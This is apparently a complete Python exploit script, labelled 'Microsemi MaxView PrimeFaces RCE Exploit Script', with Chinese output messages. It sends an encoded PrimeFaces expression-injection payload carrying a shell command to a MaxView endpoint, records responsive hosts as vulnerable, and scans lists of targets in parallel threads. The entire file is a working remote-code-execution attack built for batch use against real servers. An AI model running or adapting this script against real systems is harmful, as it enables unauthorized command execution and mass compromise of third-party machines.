import requests
import sys
import threading
from queue import Queue
import argparse


url_queue = Queue()



def check_rce(url):
    vuln_url = url + "/maxview/manager/javax.faces.resource/dynamiccontent.properties.xhtml"
    payload = "echo 123"


    data = f"pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd={{{payload}}}"


    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:

        response = requests.post(vuln_url, headers=headers, data=data, timeout=5, verify=False)


        if response.status_code == 200 and '123' in response.text:
            print(f"[+] 目标网址存在漏洞: {url}")
            with open("vuln_urls.txt", "a") as f:
                f.write(url + "\n")
        else:
            print(f"[-] 目标网址不存在漏洞: {url}")

    except Exception as e:
        print(f"[ERROR] 无法连接到目标网址 {url}: {str(e)}")
        pass



def worker():
    while not url_queue.empty():
        url = url_queue.get()
        try:
            check_rce(url)
        finally:

            url_queue.task_done()





def main():
    parser = argparse.ArgumentParser(
        description="Microsemi MaxView PrimeFaces RCE Exploit Script with Batch and Multithreading Support")

    parser.add_argument('-u', '--url', type=str, help='单个url检测')
    parser.add_argument('-f', '--file', type=str, help='从文件中批量检测')
    parser.add_argument('-t', '--threads', type=int, default=10,
                        help='更改线程使检测速度加快 （默认为：10）')

    args = parser.parse_args()

    if args.url:

        check_rce(args.url)

    elif args.file:

        try:
            with open(args.file, "r") as file:
                urls = file.readlines()
        except Exception as e:
            print(f"[ERROR] Could not read file: {str(e)}")
            sys.exit(1)


        for url in urls:
            url_queue.put(url.strip())


        num_threads = args.threads


        for _ in range(num_threads):
            thread = threading.Thread(target=worker)
            thread.daemon = True  # Make threads daemons so they exit when main thread exits
            thread.start()


        url_queue.join()




if __name__ == "__main__":
    main()

